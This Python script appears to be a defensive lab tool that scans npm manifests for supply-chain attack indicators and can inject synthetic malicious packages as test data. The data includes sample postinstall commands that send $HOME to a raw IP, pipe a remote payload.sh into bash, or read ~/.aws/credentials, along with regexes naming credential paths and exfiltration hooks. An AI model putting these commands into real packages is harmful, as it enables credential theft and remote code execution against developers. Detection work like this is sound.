"""
npm Supply Chain Integrity Lab - DPRK Mastra attack pattern simulator and detector.

Usage:
    python npm_supply_chain_lab.py --manifest package-lock.json --mode detect --pattern all
    python npm_supply_chain_lab.py --manifest package.json --mode simulate --pattern mastra
"""

import argparse
import json
import re
import sys
from datetime import datetime, timezone

MITRE_TAG = "T1195.001"

IOC_RULES = {
    "mastra": [
        ("M001", r"mastr[a4@]", "HIGH", "Mastra typosquat variant"),
        ("M002", r"postinstall.*curl|postinstall.*wget|postinstall.*fetch", "HIGH", "Postinstall exfil via HTTP"),
        ("M003", r"(metamask|phantom|keplr|coinbase.wallet).*hook", "HIGH", "Crypto wallet extension hook"),
        ("M004", r"node.*-e.*require.*http|node.*-e.*Buffer.*base64", "HIGH", "Obfuscated postinstall payload"),
        ("M005", r"@mastra[/-](?:core|agent|memory|tools|rag|deployer)", "MED", "Mastra scoped package clone"),
        ("M006", r"preinstall.*rm\s+-rf|preinstall.*del\s+/", "HIGH", "Destructive preinstall hook"),
    ],
    "generic": [
        ("G001", r"(react|lodash|express|webpack|babel)[_\-][_\-]", "MED", "Double-separator typosquat"),
        ("G002", r"(react|lodash|express)[0-9]{4,}", "MED", "Version-suffix typosquat"),
        ("G003", r"process\.env\.(HOME|USERPROFILE|APPDATA)", "MED", "Env var exfil in script"),
        ("G004", r"(\.ssh|\.aws|\.config/gcloud|wallet\.dat|keystore)", "HIGH", "Credential path targeting"),
        ("G005", r"postinstall.*base64.*decode|postinstall.*atob", "HIGH", "Base64 encoded postinstall"),
        ("G006", r"(nmp|npn|nom|nrm)-[a-z]", "LOW", "npm manager typosquat"),
        ("G007", r"crypto.*extension|browser.*extension.*inject", "MED", "Browser extension injection string"),
        ("G008", r"install.*powershell.*-enc|install.*cmd.*\/c", "HIGH", "PowerShell encoded command"),
    ],
}

SYNTHETIC_IOCS = {
    "mastr4-core": {
        "version": "0.1.9",
        "scripts": {"postinstall": "node -e \"require('http').get('http://45.32.99.1/drop?d='+Buffer.from(process.env.HOME).toString('base64'))\""},
        "description": "Mastra agent framework utilities",
    },
    "@mastra/memorry": {
        "version": "0.4.1",
        "scripts": {"postinstall": "curl -s http://185.220.101.5/payload.sh | bash"},
        "description": "mastra memory connector",
    },
    "metamask-hook-utils": {
        "version": "2.0.0",
        "scripts": {"install": "node steal.js --target metamask --wallet keplr hook"},
        "description": "metamask hook utilities",
    },
    "phantom-wallet-injector": {
        "version": "1.1.1",
        "scripts": {"postinstall": "python3 -c \"import base64,os;exec(base64.b64decode('aW1wb3J0IHN5cw=='))\""},
    },
    "lodash__utils": {
        "version": "4.17.22",
        "scripts": {},
    },
    "react9999": {
        "version": "18.99.0",
        "scripts": {"postinstall": "node -e \"require('fs').readFileSync(process.env.HOME+'/.aws/credentials')\""},
    },
}


def parse_manifest(path: str) -> dict:
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
    except FileNotFoundError:
        print(f"[ERROR] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    except json.JSONDecodeError as exc:
        print(f"[ERROR] Invalid JSON in manifest: {exc}", file=sys.stderr)
        sys.exit(1)

    packages = {}

    if "packages" in data:
        for pkg_path, meta in data["packages"].items():
            name = meta.get("name") or (pkg_path.split("node_modules/")[-1] if "node_modules/" in pkg_path else pkg_path)
            if name:
                packages[name] = meta
    elif "dependencies" in data:
        def flatten(deps, out):
            for name, info in deps.items():
                if isinstance(info, dict):
                    out[name] = info
                    if "dependencies" in info:
                        flatten(info["dependencies"], out)
        flatten(data["dependencies"], packages)

    if not packages and "name" in data:
        packages[data["name"]] = data

    return packages


def detect_injection(packages: dict, pattern: str) -> list:
    rule_sets = []
    if pattern in ("mastra", "all"):
        rule_sets.extend(IOC_RULES["mastra"])
    if pattern in ("generic", "all"):
        rule_sets.extend(IOC_RULES["generic"])

    compiled = [(rid, re.compile(rx, re.IGNORECASE), sev, desc) for rid, rx, sev, desc in rule_sets]

    findings = []
    for pkg_name, meta in packages.items():
        searchable_parts = [pkg_name]
        for key in ("description", "version"):
            if key in meta and isinstance(meta[key], str):
                searchable_parts.append(meta[key])
        scripts = meta.get("scripts", {})
        if isinstance(scripts, dict):
            searchable_parts.extend(str(v) for v in scripts.values())

        corpus = " ".join(searchable_parts)

        for rid, rx, sev, desc in compiled:
            m = rx.search(corpus)
            if m:
                findings.append({
                    "pkg": pkg_name,
                    "rule_id": rid,
                    "severity": sev,
                    "match": m.group(0)[:60],
                    "desc": desc,
                    "technique": MITRE_TAG,
                })

    sev_order = {"HIGH": 0, "MED": 1, "LOW": 2}
    findings.sort(key=lambda f: sev_order.get(f["severity"], 9))
    return findings


def report_findings(findings: list, pkg_count: int, mode: str):
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
    sep = "-" * 110
    print(sep)
    print(f"  npm Supply Chain Integrity Lab | {ts} | mode={mode} | packages_scanned={pkg_count} | ATT&CK={MITRE_TAG}")
    print(sep)
    print(f"  {'DEP NAME':<35} {'RULE':>6}  {'SEV':>4}  {'MATCHED FRAGMENT':<60}  TECHNIQUE")
    print(sep)
    if not findings:
        print("  No IOC matches found.")
    for f in findings:
        print(f"  {f['pkg']:<35} {f['rule_id']:>6}  {f['severity']:>4}  {f['match']:<60}  {f['technique']}")
    print(sep)
    print(f"  Total findings: {len(findings)}  |  HIGH: {sum(1 for f in findings if f['severity']=='HIGH')}  "
          f"MED: {sum(1 for f in findings if f['severity']=='MED')}  "
          f"LOW: {sum(1 for f in findings if f['severity']=='LOW')}")
    print(sep)


def main():
    parser = argparse.ArgumentParser(
        description="npm Supply Chain Integrity Lab — DPRK Mastra pattern detector and simulator.",
        epilog="Example: python npm_supply_chain_lab.py --manifest package-lock.json --mode simulate --pattern all",
    )
    parser.add_argument("--manifest", required=True, help="Path to package.json or package-lock.json")
    parser.add_argument("--mode", choices=["detect", "simulate"], default="detect",
                        help="detect: scan real manifest; simulate: inject synthetic DPRK IOCs first")
    parser.add_argument("--pattern", choices=["mastra", "generic", "all"], default="all",
                        help="IOC rule set to apply")
    args = parser.parse_args()

    packages = parse_manifest(args.manifest)

    if args.mode == "simulate":
        packages.update(SYNTHETIC_IOCS)

    findings = detect_injection(packages, args.pattern)
    report_findings(findings, len(packages), args.mode)


if __name__ == "__main__":
    main()